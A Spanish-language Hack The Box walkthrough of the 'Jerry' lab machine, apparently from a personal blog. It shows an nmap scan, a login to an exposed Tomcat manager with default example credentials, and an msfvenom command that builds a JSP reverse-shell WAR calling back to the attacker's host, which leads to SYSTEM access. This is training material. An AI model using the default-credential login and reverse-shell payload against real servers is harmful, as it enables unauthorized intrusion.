---
layout: writeup
title: "HTB - Jerry"
date: 2022-07-8 
difficulty: "Very-Easy"
platform: "Windows"
description: "Writeup completo de la máquina Jerry..."
image: "/assets/images/jerry.png"
---

Hoy tocaremos una máquina muy fácil de iniciación, una máquina con la que vamos a practicar un rce a tomcat 

*********************************
# Enumeración

Como siempre lanzamos nmap y vemos que tiene solo un puerto abierto, el 8080. enmaramos el puerto y vemos un apache tomcat.

>Nmap 7.92 scan initiated Fri Jul  8 19:35:38 2022 as: nmap -sCV -p8080 -oN >versions 10.10.10.95
>Nmap scan report for 10.10.10.95
>Host is up (0.051s latency).

>PORT     STATE SERVICE VERSION
>8080/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1
>|_http-favicon: Apache Tomcat
>|_http-title: Apache Tomcat/7.0.88
>|_http-open-proxy: Proxy might be redirecting requests
>|_http-server-header: Apache-Coyote/1.1





********************************
# Explotación Tomcat y Reverse shell

Abrimos el navegador y accedemos a la web por el puerto 8080, nos encontramos lo que parece un tomcat por defecto.

![inicial]({{site.baseurl}}/assets/images/Jerry/2022-07-08_193642.png)

Vamos a la opción Host manager y se nos abre una login de usuario, allí probamos el usuario admin y la contraseña admin pero nada, no nos da autorización.

Lo que si vemos es la pantalla de ejemplo de configuración de tomcat, donde nos da un ejemplo de usuario y contraseña. Usuario tomcat y contraseña s3cret. Probamos esas y bingo, el administrador no hizo bien su trabajo

![inicial]({{site.baseurl}}/assets/images/Jerry/2022-07-08_193753.png)

Vale, ya estamos como administrador, vemos que tenemos permisos para subir ficheros, en concreto unos [.war](https://www.arquitecturajava.com/modulos-de-java-ii-war/) de java.

Con msfvenom vamos a crear una reverse shell para poder subirla al tomcat y lograr acceso a la máquina.

>msfvenom -p java/jsp_shell_reverse_tcp LHOST= MI IP  LPORT= PUERTO  -f war > shell.war 

Esto nos creara un archivo war malicioso que cargaremos en el tomcat.

![inicial]({{site.baseurl}}/assets/images/Jerry/2022-07-08_195026.png)

Le damos a subir y nos aparecerá en el path de aplicaciones con el nombre que le hayamos puesto, solo nos queda ponernos en escucha con netcat y ejecutar el archivo .war.

![inicial]({{site.baseurl}}/assets/images/Jerry/2022-07-08_194915.png)

Pulsamos sobre el shell.war y listo ya estamos dentro.

![inicial]({{site.baseurl}}/assets/images/Jerry/2022-07-08_195109.png)

Hacemos un Whoami y vemos que somos ¡NT-Authority system! solo nos queda ir a por las flags ya que tenemos acceso pleno.

![inicial]({{site.baseurl}}/assets/images/Jerry/2022-07-08_195224.png)

Una máquina muy, muy sencilla de iniciación que está muy bien para conocer las reverse shell, nos vemos en otra máquina.
